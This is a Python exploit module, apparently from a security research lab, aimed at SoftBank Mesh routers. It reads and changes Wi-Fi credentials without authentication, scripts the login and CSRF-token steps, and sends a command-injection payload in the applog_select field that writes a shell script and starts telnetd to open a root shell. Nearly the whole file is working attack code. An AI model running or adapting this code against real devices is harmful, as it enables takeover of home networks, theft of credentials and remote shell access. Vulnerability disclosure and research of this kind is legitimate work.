# sbmeshApi.py
# @package   SoftBank Mesh API
# @author    Samy Younsi - NeroTeam Security Labs <samy@neroteam.com>
# @license   Proprietary License - All Rights Reserved
# @docs      https://neroteam.com/blog/

import argparse
from datetime import datetime
import time
import requests
import json
import re
import os
from sbmeshEncryption import (
    decrypt,
    encrypt,
    generateAppDeriveKey,
    hexHmacSha256,
    hexSha256,
)


"""
GET Wi-Fi Credentials - NO AUTH REQUIRED
"""


def getWifiCreds(deviceInfo):
    headers = {"Accept-Language": "en-US,en;q=0.5", "Referer": "0_0"}
    url = "http://{}/data/activation.json".format(deviceInfo["mesh_ip"])
    response = requests.get(url, headers=headers)

    return response.text


"""
UPDATE Wi-FI configuration - NO AUTH REQUIRED
"""


def setWifiCreds(deviceInfo):
    if not deviceInfo["wifi_name"] or not deviceInfo["wifi_password"]:
        raise ValueError(
            "[ERROR] 'setWifiCreds': The wifi_name or the wifi_password keys are not defined in deviceInfo"
        )

    headers = {"Accept-Language": "en-US,en;q=0.5", "Referer": "0_0"}

    data = {
        "pageid": "wiz_ctrl_W1",
        "action": "config",
        "ctrl_protection": "wpawpa2",
        "ctrl_ssid": deviceInfo["wifi_name"],
        "ctrl_password": deviceInfo["wifi_password"],
    }

    url = "http://{}/data/activation.json".format(deviceInfo["mesh_ip"])
    response = requests.post(url, headers=headers, data=data)

    if response.status_code == 200:
        return f"[INFO] Wi-Fi configuration has been successfully updated.\n[INFO] Please wait a few seconds for the changes to take effect."
    else:
        return f"[ERROR] Failed to set Wi-Fi creds: {response.status_code} - {response.text}"


"""
Enable Telnet using Remote Code Injection (RCE) - AUTH REQUIRED!
"""


def execTelnetRce(deviceInfo):
    if not deviceInfo["mesh_username"] or not deviceInfo["mesh_password"]:
        raise ValueError(
            "[ERROR] 'execTelnetRce': mesh_username and mesh_password keys are not defined in deviceInfo"
        )
    session_id, dk = loadSessionIDAndDK(deviceInfo)

    headers = {
        "Accept-Language": "en-US,en;q=0.5",
        "Cookie": "username=user; session_id={}".format(session_id),
    }

    timestamp = str(int(time.time() * 1000))

    applogCsrfToken = getApplogCsrfToken(deviceInfo, headers)
    payload = 'applog_select=A;echo "#!/bin/sh" > /tmp/slogin;echo "export PATH=/bin:/sbin:/usr/bin:/usr/sbin" >> /tmp/slogin;echo "/bin/sh" >> /tmp/slogin;/bin/chmod 755 /tmp/slogin;/usr/sbin/telnetd -l /tmp/slogin'

    url = "http://{}/data/statussupporteventlog_applog_download.json?_={}&csrf_token={}".format(
        deviceInfo["mesh_ip"], timestamp, applogCsrfToken
    )
    response = requests.post(url, headers=headers, data=payload)
    if response.status_code == 200:
        return f"[INFO] RCE successfully exploited! Telnet is now open.\n[INFO] telnet {deviceInfo['mesh_ip']}"
    else:
        return f"[ERROR] Failed to exploit the RCE flaw. It may have been patched?:\n{response.status_code} - {response.text}"


def getApplogCsrfToken(deviceInfo, headers):
    url = "http://{}/status-and-support.html#sub=debug_log".format(
        deviceInfo["mesh_ip"]
    )

    response = requests.get(url, headers=headers)
    csrfToken = re.search(r"var csrf_token = '([a-zA-Z0-9]+)'", response.text).group(1)
    return csrfToken


"""
Login to SB Mesh to get the DK token and session ID
"""


def loginRequest(deviceInfo):
    loginCsrfToken = getLoginCsrfToken(deviceInfo)
    hashPass = hexHmacSha256("$1$SERCOMM$", deviceInfo["mesh_password"])
    encryptionKey, salt = getSaltAndEncryptionKey(deviceInfo)
    hashPassEnc = hexHmacSha256(encryptionKey, hashPass)

    headers = {
        "Accept-Language": "en-US,en;q=0.5",
    }

    data = {
        "LoginName": deviceInfo["mesh_username"],
        "LoginPWD": hashPassEnc,
    }
    timestamp = str(int(time.time() * 1000))
    response = requests.post(
        "http://{}/data/login.json?_={}&csrf_token={}".format(
            deviceInfo["mesh_ip"], timestamp, loginCsrfToken
        ),
        headers=headers,
        data=data,
        verify=False,
    )

    response_content = response.content.decode("utf-8")

    if response_content == '"2"':
        print("[ERROR] A user is logged into the device.")
    elif response_content == '"3"' or response_content == '"4"':
        print("[ERROR] The password you entered was incorrect.")

    session_id = None
    if "Set-Cookie" in response.headers:
        cookies = response.headers.get("Set-Cookie")
        for cookie in cookies.split(";"):
            if "session_id=" in cookie:
                session_id = cookie.split("session_id=")[-1]
                break

    dk = generateAppDeriveKey(deviceInfo["mesh_password"], salt)
    return session_id, dk


def getLoginCsrfToken(deviceInfo):
    url = "http://{}/login.html".format(deviceInfo["mesh_ip"])

    headers = {
        "Accept-Language": "en-US,en;q=0.5",
    }

    response = requests.get(url, headers=headers)
    csrfToken = re.search(r"var csrf_token = '([a-zA-Z0-9]+)'", response.text).group(1)
    return csrfToken


def getSaltAndEncryptionKey(deviceInfo):
    timestamp = str(int(time.time() * 1000))

    headers = {
        "Accept-Language": "en-US,en;q=0.5",
    }

    response = requests.get(
        "http://{}/data/user_lang.json?_={}".format(deviceInfo["mesh_ip"], timestamp),
        headers=headers,
        verify=False,
    )
    data = json.loads(response.content)

    encryption_key = next(
        (item["encryption_key"] for item in data if "encryption_key" in item), None
    )
    salt = next((item["salt"] for item in data if "salt" in item), None)

    if not encryption_key or not salt:
        raise ValueError(
            "[ERROR] 'getSaltAndEncryptionKey': Encryption key or salt not found in the response, is device IP address correct?"
        )
    return encryption_key, salt


"""
Load Session ID and Decryption key
"""


def loadSessionIDAndDK(deviceInfo):
    session_id, dk = loginRequest(deviceInfo)
    return session_id, dk
